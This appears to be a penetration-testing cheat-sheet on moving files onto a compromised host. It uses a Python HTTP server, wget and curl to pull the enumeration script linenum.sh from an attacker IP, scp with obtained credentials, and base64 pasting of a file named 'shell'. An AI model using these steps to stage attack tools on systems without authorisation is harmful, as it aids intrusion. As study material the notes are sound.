# TRANSFERRING FILES
## WGET/CURL
First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it

> cd /tmp
> python3 -m http.server 8000
> wget http://[IP]:[PORT]/linenum.sh

If remote server does not have WGET, we can also use cURL.

> curl http://[IP]:[PORT]/linenum.sh -o linenum.sh

## USING SCP
Granted we have obtained ssh user credentials on the remote host. We can do so as follows:
> scp linenum.sh user@remotehost:/tmp/linenum.sh
> user@remotehost's password: ******

## USING BASE64
In some case we may not be able to transfer the file. In this situations, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it.

> base64 shell -w 0

We can copy the result of this, go to the remote host and decode it.

> user@remotehost$ echo ............. | base64 -d > shell

## VALIDATING FILE TRANSFERS
To validate the format of a file we can run the next command:

> file shell

To ensure we did not mess up the file we can check its md5 hash.

> ownuser@machine$ md5sum shell
> user@remotehost$ md5sum shell

If both files have the same md5 hash, means that the file was correctly transfer.
